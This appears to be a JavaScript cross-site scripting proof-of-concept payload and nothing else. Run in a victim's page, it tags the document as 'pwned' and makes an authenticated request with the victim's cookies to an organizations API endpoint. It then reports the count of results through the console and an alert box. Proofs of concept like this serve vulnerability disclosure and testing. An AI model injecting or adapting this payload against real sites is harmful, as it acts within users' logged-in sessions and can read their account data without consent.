(function () {
  document.documentElement.setAttribute('data-pwned', '1');
  var host = location.host;
  fetch('/api/v1/organizations/', { credentials: 'include' })
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (j) {
      var n = (j && j.results) ? j.results.length : 'n/a';
      console.log('[POC] XSS on ' + host + ' orgs=' + n);
      alert('XSS OK\nhost: ' + host + '\norgs: ' + n);
    })
    .catch(function () { console.log('[POC] xss exec (fetch err) ' + host); alert('XSS OK (no fetch)\n' + host); });
})();
